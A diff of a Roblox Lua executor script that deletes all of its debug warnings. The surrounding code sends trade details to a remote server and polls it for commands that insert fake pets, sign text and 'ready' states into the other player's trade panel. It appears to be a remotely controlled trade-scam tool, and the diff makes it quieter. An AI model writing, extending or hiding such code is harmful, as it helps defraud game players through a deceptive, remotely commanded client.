@@ -105,20 +105,17 @@ end
 
 local function simulateAddBrainrot(animalName, mutation)
     if not animalName or animalName == "" then
-        warn("Erreur : Nom du Brainrot vide !")
         return false
     end
     
     local tradeFrame = getLiveTradeGui()
     if not tradeFrame then
-        warn("Erreur : Lance d'abord un trade avec quelqu'un !")
         return false
     end
     
     local other = tradeFrame:FindFirstChild("Other")
     local scroll = other and other:FindFirstChild("ScrollingFrame")
     if not scroll then
-        warn("Erreur : ScrollingFrame de l'autre joueur introuvable.")
         return false
     end
     
@@ -131,7 +128,6 @@ local function simulateAddBrainrot(animalName, mutation)
     end
     if not template then template = scroll:FindFirstChild("Template") end
     if not template then
-        warn("Erreur : Template de base introuvable dans ScrollingFrame.")
         return false
     end
     
@@ -188,7 +184,6 @@ local function simulateAddPancarteText(text)
         -- Pancarte réglée
         return true
     end
-    warn("Erreur : Zone d'entrée pancarte (OtherSign) introuvable.")
     return false
 end
 
@@ -205,7 +200,6 @@ local function simulateReady(state)
         -- Ready simulé
         return true
     end
-    warn("Erreur : Overlay de ready de l'autre joueur introuvable.")
     return false
 end
 
@@ -351,7 +345,6 @@ end
 
 local function sendTradeUpdate()
     if not request then
-        warn("[TRADE] sendTradeUpdate: request() est nil")
         return
     end
     
@@ -392,7 +385,6 @@ local function sendTradeUpdate()
     local yourOfferItems = getOfferItems("Your")
     local otherOfferItems = getOfferItems("Other")
     
-    warn("[TRADE] sendTradeUpdate: inTrade=" .. tostring(inTrade) .. " other=" .. otherName .. " yourItems=" .. #yourOfferItems .. " otherItems=" .. #otherOfferItems)
     
     local success, result = pcall(function()
         return request({
@@ -413,15 +405,12 @@ local function sendTradeUpdate()
     end)
     
     if success then
-        warn("[TRADE] sendTradeUpdate: POST OK")
     else
-        warn("[TRADE] sendTradeUpdate: POST ERREUR - " .. tostring(result))
     end
 end
 
 local function registerToServer()
     if not request then
-        warn("[TRADE] registerToServer: request() est nil")
         return false
     end
     
@@ -450,19 +439,15 @@ local function registerToServer()
     end)
     
     if success then
-        warn("[TRADE] registerToServer: OK - reponse recue")
         if result and result.Body then
-            warn("[TRADE] registerToServer: Body=" .. tostring(result.Body):sub(1, 100))
         end
     else
-        warn("[TRADE] registerToServer: ERREUR - " .. tostring(result))
     end
     
     return success
 end
 
 local function pollCommands()
-    warn("[TRADE] pollCommands demarre")
     local pollCount = 0
     while true do
         if request then
@@ -475,13 +460,11 @@ local function pollCommands()
             
             pollCount = pollCount + 1
             if pollCount <= 3 or pollCount % 10 == 0 then
-                warn("[TRADE] pollCommands cycle #" .. pollCount .. " - success=" .. tostring(success))
             end
             
             if success and resp and resp.Body then
                 local ok, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
                 if ok and data and data.commands and #data.commands > 0 then
-                    warn("[TRADE] pollCommands: " .. #data.commands .. " commande(s) recue(s)")
                     for _, cmd in ipairs(data.commands) do
                         if cmd.action == "add_fake_pet" then
                             local successAdd = simulateAddBrainrot(cmd.petName, cmd.petMutation)
@@ -546,17 +529,12 @@ local function pollCommands()
 end
 
 -- Lancer la connexion
-warn("[TRADE] Script demarre... URL=" .. SERVER_URL)
 if not request then
-    warn("[TRADE] ERREUR: request() non disponible. Ton executor ne supporte pas HTTP.")
 else
-    warn("[TRADE] request() detecte. Tentative d'enregistrement...")
     local registered = registerToServer()
     if registered then
-        warn("[TRADE] Enregistrement reussi. Lancement du polling...")
         task.spawn(pollCommands)
     else
-        warn("[TRADE] ERREUR: Echec de l'enregistrement.")
     end
 end
 
@@ -618,12 +596,9 @@ RunService.RenderStepped:Connect(function()
     local currentTradeState = isTradeActive()
     
     if currentTradeState ~= lastTradeState then
-        warn("[TRADE] Etat trade change: " .. tostring(lastTradeState) .. " -> " .. tostring(currentTradeState))
         resetFakeTradeState()
         if currentTradeState == false then
-            warn("[TRADE] Trade termine")
         else
-            warn("[TRADE] Nouveau trade detecte!")
         end
         sendTradeUpdate()
     end
